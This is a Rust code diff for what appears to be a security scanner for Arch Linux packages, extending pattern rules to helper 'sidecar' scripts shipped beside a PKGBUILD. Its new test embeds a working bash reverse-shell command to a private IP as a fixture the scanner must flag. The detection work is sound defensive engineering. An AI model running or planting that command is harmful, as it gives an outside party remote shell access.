@@ -53,17 +53,23 @@ impl SecurityAnalyzer for PatternAnalyzer {
             }
         }
 
-        // Analyze install scriptlets and ALPM side scripts (*.hook). Same rule
-        // surface: both run with elevated trust during a pacman transaction.
+        // Analyze install scriptlets, ALPM side scripts (*.hook) and local source
+        // sidecars (helper scripts shipped next to the PKGBUILD). Install
+        // scriptlets and hooks run with elevated trust during a pacman
+        // transaction; sidecars run inside build()/package(). A sidecar is
+        // tagged `FileType::SourceFile` by the scanner, a file type that every
+        // PKGBUILD rule also applies to (see `RuleEngine::add_rule`).
         for script in context.all_scripts() {
-            let kind = if script.path.extension().and_then(|e| e.to_str()) == Some("hook") {
+            let is_hook = script.path.extension().and_then(|e| e.to_str()) == Some("hook");
+            let file_type = script.file_type;
+            let kind = if is_hook {
                 "alpm hook"
+            } else if file_type == FileType::SourceFile {
+                "source sidecar"
             } else {
                 "install script"
             };
-            let script_matches = self
-                .rule_engine
-                .match_content(&script.content, FileType::InstallScript);
+            let script_matches = self.rule_engine.match_content(&script.content, file_type);
 
             for rule_match in script_matches {
                 if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
@@ -83,7 +89,7 @@ impl SecurityAnalyzer for PatternAnalyzer {
                         cwe_id: rule.cwe_id.clone(),
                         metadata: serde_json::json!({
                             "matched_text": rule_match.matched_text,
-                            "in_install_script": true,
+                            "in_install_script": !matches!(file_type, FileType::SourceFile),
                             "script_kind": kind,
                         }),
                     });
@@ -355,5 +361,23 @@ package() {
         let findings = analyzer.analyze(&context).await.unwrap();
         // Should have no critical findings
         assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
+    }
+
+    #[tokio::test]
+    async fn sidecar_scripts_are_scanned_with_pkgbuild_rules() {
+        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
+        let mut context = create_test_context("pkgname=t\npkgver=1\npkgrel=1\n");
+        context
+            .side_scripts
+            .push(crate::parser::ParsedInstallScript {
+                content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n".to_string(),
+                path: PathBuf::from("helper.sh"),
+                hooks: vec![],
+                file_type: FileType::SourceFile,
+            });
+        let findings = analyzer.analyze(&context).await.unwrap();
+        let f = findings.iter().find(|f| f.id == "SHELL-001");
+        assert!(f.is_some(), "sidecar reverse shell missed: {findings:?}");
+        assert_eq!(f.unwrap().location.file, PathBuf::from("helper.sh"));
     }
 }
